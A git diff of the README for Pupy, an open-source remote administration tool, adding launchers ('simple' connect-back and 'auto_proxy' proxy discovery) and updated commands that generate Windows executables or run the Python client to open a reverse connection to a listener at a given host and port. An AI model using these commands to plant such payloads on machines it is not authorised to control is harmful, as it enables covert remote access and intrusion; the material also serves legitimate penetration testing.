@@ -29,6 +29,13 @@ Pupy is an opensource, multi-platform Remote Administration Tool with an embedde
 - scramblesuit
 	- [A Polymorphic Network Protocol to Circumvent Censorship](http://www.cs.kau.se/philwint/scramblesuit/)
 
+## Implemented Launchers :
+Launchers allow pupy to run custom actions before starting the reverse connection
+- simple
+	- Just connect back
+- auto_proxy
+	- Retrieve a list of possible SOCKS/HTTP proxies and try each one of them. Proxy retriaval methods are : registry, WPAD requests, gnome settings, HTTP_PROXY env variable
+
 ## Implemented Modules :
 - migrate
   - inter process architecture injection also works (x86->x64 and x64->x86)
@@ -66,28 +73,32 @@ In these examples the server is running on a linux host (tested on kali linux) a
 The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac OS X 10.10.5) 
 #### for Windows
 ```bash
-./pupygen.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
+$ ./pupygen.py auto_proxy -h
+usage: auto_proxy [-h] --host <host:port>
+                  [--transport {obfs3,tcp_cleartext,tcp_ssl,tcp_base64,scramblesuit}]
+				                    ...
+$ ./pupygen.py -t exe_x86 auto_proxy --transport tcp_ssl --host 192.168.2.132:443
+binary generated with config :
+OUTPUT_PATH = ~/pupy/pupyx86.exe
+LAUNCHER = 'auto_proxy'
+LAUNCHER_ARGS = ['--transport', 'tcp_ssl', '--host', '192.168.2.132:443']
+OFFLINE_SCRIPT = None
+
+									
 ```
 you can also :
+- use another launcher (currently simple or auto_proxy)
 - use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/load it by your own means.
 - customize the transport used by supplying it with --transport
 
-#### for Linux
+#### for Linux & Mac OS X
 ```bash
 pip install rpyc #(or manually copy it if you are not admin)
-python pp.py 192.168.0.1:443
+python pp.py simple --transport tcp_ssl --host 127.0.0.2:443
 ```
-you can also build a single binary with pyinstaller :
-```bash
-pyinstaller --onefile /full_path/pupy/pupy/pp.py
-```
-
-#### for MAC OS X
-```bash
-easy_install rpyc #(or manually copy it if you are not admin)
-python pp.py 192.168.0.1:443
-```
-you can also build a single binary with pyinstaller (but you can't "cross-compile", pyinstaller currently only support this from osx):
+you can also :
+- modify the default arguments at the top of the file to call pp.py without arguments
+- build a single binary with pyinstaller :
 ```bash
 pyinstaller --onefile /full_path/pupy/pupy/pp.py
 ```
@@ -196,7 +207,7 @@ Some ideas without any priority order
 - [ ] split the README into the wiki
 - [ ] The backdoor factory ?
 - [ ] Impacket ?
-- [ ] support for https proxy
+- [X] support for https & socks proxy
 - [ ] HTTP transport
 - [ ] UDP transport
 - [ ] DNS transport
